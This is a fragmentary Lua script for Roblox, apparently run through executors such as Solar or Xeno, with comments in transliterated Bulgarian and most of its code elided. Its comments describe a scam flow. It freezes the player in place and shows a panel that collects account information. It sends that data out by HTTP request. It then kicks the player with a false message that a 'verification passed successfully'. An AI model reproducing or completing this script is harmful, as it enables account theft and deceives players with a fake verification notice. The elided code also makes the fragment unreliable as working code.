...
-- Zamrazqvane na igracha (Freeze), za da ne izbyaga ot panela
pcall(function()
...
-- Suzdavane na interfeysa v PlayerGui (nay-stabilno za Solar)
...
-- Osnovna funktsiya za izprashtane na dannite
local function SendData()
    ...
    -- Subirane na informatsiya za akaunta
    local brCount = "0"
    pcall(function()
    ...
    -- Izprashtane chrez HTTP Request (poddurja se ot Solar/Xeno)
    ...
    -- Kick-vane na igracha za realizum
    task.wait(0.5)
    p:Kick("\n[Успешно]\nПроверката премина успешно. Моля, влезте отново в играта.")
end

-- Izprashtane pri klik na butona
Submit.MouseButton1Click:Connect(SendData)

-- Izprashtane pri natiskane na ENTER v tekstovoto pole
